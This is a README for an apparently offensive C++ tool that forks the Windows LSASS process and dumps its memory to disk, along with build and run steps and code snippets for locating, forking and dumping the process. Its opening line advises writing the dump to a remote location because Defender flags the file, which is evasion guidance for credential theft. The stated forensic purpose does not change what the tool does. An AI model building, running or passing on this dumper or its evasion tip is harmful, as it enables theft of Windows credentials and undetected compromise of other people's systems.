
# LSASS Process Dumper

Note: While the executable is not flagged by Defender, the .dmp file that is written to disk will be flagged. Dump it to a remote location.

This project demonstrates how to create a fork of the LSASS process and dump its memory using the Windows API. This can be useful for forensic analysis and security research.

## Features

- Locates the LSASS process by name.
- Uses `NtCreateProcessEx` to create a fork of the LSASS process.
- Dumps the memory of the forked process to a file using `MiniDumpWriteDump`.

## Prerequisites

- Windows operating system
- Visual Studio or any other C++ compiler
- Administrator privileges

## Libraries and Dependencies

- `windows.h`
- `DbgHelp.h`
- `TlHelp32.h`
- `winternl.h`
- `tchar.h`
- Link with `Dbghelp.lib` and `ntdll.lib`

## How to Build

1. Clone the repository.
2. Open the project in Visual Studio or your preferred C++ development environment.
3. Ensure that you have linked `Dbghelp.lib` and `ntdll.lib` in your project settings.
4. Build the project.

## How to Run

1. Ensure you are running with administrator privileges.
2. Execute the compiled binary.
3. The program will create a memory dump of the forked LSASS process and save it as `lsass_forked.dmp`.

## Code Explanation

### Finding LSASS PID

The program takes a snapshot of all running processes and iterates through them to find the process with the name `lsass.exe`.

```cpp
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
PROCESSENTRY32 processEntry = {};
processEntry.dwSize = sizeof(PROCESSENTRY32);

if (Process32First(snapshot, &processEntry)) {
    do {
        if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
            lsassPID = processEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &processEntry));
}
```

### Creating Forked Process

The program uses `NtCreateProcessEx` to create a new process that is a fork of the LSASS process.

```cpp
pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
NTSTATUS status = NtCreateProcessEx(&forkedProcess, PROCESS_ALL_ACCESS, NULL, lsassHandle, 0, NULL, NULL, NULL);
```

### Dumping the Forked Process

The program uses `MiniDumpWriteDump` to create a dump of the forked process.

```cpp
DWORD forkedProcessPID = GetProcessId(forkedProcess);
BOOL isDumped = MiniDumpWriteDump(forkedProcess, forkedProcessPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
```

## License

This project is licensed under the MIT License.
